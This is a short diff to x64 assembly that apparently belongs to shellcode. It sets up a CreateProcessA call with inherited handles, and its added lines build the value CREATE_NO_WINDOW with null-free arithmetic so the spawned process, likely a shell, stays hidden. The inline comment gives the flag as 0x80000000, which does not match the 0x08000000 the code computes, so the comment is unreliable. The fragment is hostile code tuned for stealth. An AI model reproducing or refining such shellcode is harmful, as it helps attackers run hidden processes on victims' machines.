@@ -282,8 +282,13 @@ call_CreateProccessA:
     xor rax, rax
     inc eax
     mov [rsp + 0x20], rax               ; Parameter bInheritHandles = 1
-    dec eax
-    mov [rsp + 0x28], rax               ; Parameter dwCreationFlags = 0
+    ;dec eax
+	mov rax, 0xFFFFFFFFF7FFFFFF
+  	neg rax
+  	dec al	
+    ;mov [rsp + 0x28], rax               ; Parameter dwCreationFlags = 0
+	mov [rsp + 0x28], rax               ; Parameter dwCreationFlags = 0x80000000 == CREATE_NO_WINDOW
+	xor rax, rax
     mov [rsp + 0x30], rax               ; Parameter lpEnvironment = 0
     mov [rsp + 0x38], rax               ; Parameter lpCurrentDirectory = 0
     mov [rsp + 0x40], rbx               ; Parameter lpStartupInfo = address of _STARTUPINFO
